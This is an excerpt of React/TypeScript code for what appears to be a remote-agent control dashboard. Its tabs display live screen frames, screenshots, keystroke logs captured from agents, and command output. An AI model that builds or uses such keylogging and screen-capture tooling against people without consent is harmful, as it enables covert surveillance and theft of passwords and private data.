...
function RemoteTab({ agentId, agent, dispatch }: { agentId: string; agent: any; dispatch: any }) {
  ...
  useEffect(() => {
    ...
    const unsubResult = on('result', (msg) => {
      if (msg.agent_id !== agentId) return
      const p = msg.payload as any
      if ((p?.module === 'screenshot' || p?.module === 'screen_stream') && (typeof p?.data === 'string' || p?.data?.image_b64)) {
        setLastFrame(typeof p.data === 'string' ? p.data : p.data.image_b64)
      }
    })

    const unsubScreen = on('screen_frame', (msg) => {
      if (msg.agent_id !== agentId) return
      const p = msg.payload as any
      const img = p?.frame || (typeof p?.data === 'string' ? p.data : p?.data?.image_b64)
      if (img) setLastFrame(img)
    })
  ...
  }, [on, subscribe, unsubscribe, agentId])
...
function ScreenshotTab({ agentId, dispatch }: { agentId: string; dispatch: any }) {
  ...
  useEffect(() => {
    const unsub = on('result', (msg) => {
      if (msg.agent_id !== agentId) return
      const p = msg.payload as any
      if (p?.module === 'screenshot' || typeof p?.data === 'string' || p?.data?.image_b64) {
        const img = typeof p?.data === 'string' ? p.data : p?.data?.image_b64 || p?.data?.frames?.[0]
...
function KeylogTab({ agentId, dispatch }: { agentId: string; dispatch: any }) {
  ...
  useEffect(() => {
    const unsub = on('result', (msg) => {
      if (msg.agent_id !== agentId) return
      const p = msg.payload as any
      if (p?.module === 'keylog' || p?.data?.keys) {
        const newKeys = p?.data?.keys
        if (Array.isArray(newKeys) && newKeys.length > 0) {
          const text = newKeys.map((k: any) => `${k.t ? k.t.split('T')[1] : ''} ${k.k || ''}`).join(' ')
          setBuffer((prev) => (prev ? prev + ' ' : '') + text)
        }
        if (p?.data?.buffer && typeof p.data.buffer === 'string') setBuffer(p.data.buffer)
      }
    })
    return unsub
  }, [on, agentId])
...
function formatPayloadResult(payload: any): string {
  ...
  if (typeof payload?.stdout === 'string') return payload.stdout.slice(0, 500)
